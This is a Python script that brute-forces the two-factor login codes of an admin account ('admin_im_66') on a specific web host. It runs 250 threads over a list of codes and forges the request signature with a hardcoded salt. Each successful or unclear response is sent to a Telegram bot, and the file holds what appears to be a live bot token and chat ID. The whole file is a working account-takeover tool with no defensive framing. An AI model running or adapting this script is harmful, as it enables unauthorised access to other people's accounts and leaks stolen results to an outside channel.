import http.client
import time
import hashlib
import json
import threading
import requests
file_lock_all = threading.Lock()
file_lock_other = threading.Lock()
file_lock_success = threading.Lock()
api_key = "6484100470:AAGek2GBBZfb38pGLeVaHV2uZXon9lUx5Yc"
chat_id = "-1002123701323"
response_file = open ("all_response.txt", "a", encoding='utf-8')
others_file = open("others.txt", "a", encoding="utf-8") 
success_file = open("success.txt", "a", encoding="utf-8")

def login(codes,username):
    global response_file, others_file, success_file
    for code in codes:
      conn = http.client.HTTPSConnection("akali.63388.com")
      payload = json.dumps({
        "username": username,
        "code": str(code).strip()
      })
      ts = int(time.time())
      sign = hashlib.md5(f"""d78585e683ed11eaa13f0242ac110003{ts}""".encode())
      headers = {
        'sign': str(sign.hexdigest()),
        'timestamp': str(ts),
        'token': '',
        'Content-Type': 'application/json'
      }
      conn.request("POST", "/api/admin/login/google", payload, headers)
      res = conn.getresponse()
      data = res.read()
      obj_json = json.loads(data.decode("utf-8"))
      with file_lock_all:
        response_file.write(f"""Failed : {code} - response:{str(obj_json)}""" )
        response_file.write("\n\n")
        response_file.write("----------------------------------------------")
        response_file.write("\n\n")
      if "code" in obj_json:
          if obj_json["code"] == "Unauthorized" or obj_json["code"] == "ExtraordinaryParameter":
              print(f"""Failed : {code}""")
          else:
              print(f"""Success : {code},response:{str(obj_json)}""")
              message_text = (f"""Success : {code},response:{str(obj_json)}""")
              url = f"https://api.telegram.org/bot{api_key}/sendMessage"
              params = {"chat_id": chat_id, "text": message_text}
              response = requests.post(url, params=params)
              print(response.text)
              with file_lock_success:
                  success_file.write(f"""Success : {code}, response:{str(obj_json)}, headers: {str(dict(res.getheaders()))}""")
                  exit(0)
      else:
          print(f"""Check : {code},response:{str(obj_json)}""")
          message_text = (f"""Check : {code},response:{str(obj_json)}""")
          url = f"https://api.telegram.org/bot{api_key}/sendMessage"
          params = {"chat_id": chat_id, "text": message_text}
          response = requests.post(url, params=params)
          print(response.text)
          with file_lock_other: 
              others_file.write(f"""Code : {code}, response:{str(obj_json)}, headers: {str(dict(res.getheaders()))}""")
              others_file.write("\n\n")
              others_file.write("----------------------------------------------")
              others_file.write("\n\n")
              

def start(username):
    threads = []
    thread_count = 250
    with open("codes.txt", "r") as codefile:
        codes = codefile.readlines()
        chunk_size = len(codes) // thread_count
        remainder = len(codes) % thread_count
        code_chunks = [codes[i:i + chunk_size] for i in range(0, len(codes) - remainder, chunk_size)]
        code_chunks.extend([codes[-remainder:]]) if remainder else None
        while True:
            for code_chunk in code_chunks:
                thread = threading.Thread(target=login, args=(code_chunk, username,))
                threads.append(thread)
            
            for thread in threads:
                thread.start()
            
            for thread in threads:
                thread.join()
            
            del threads[:]



if __name__ == '__main__':
    try:
        start("admin_im_66")
    except Exception as e:
        print(e)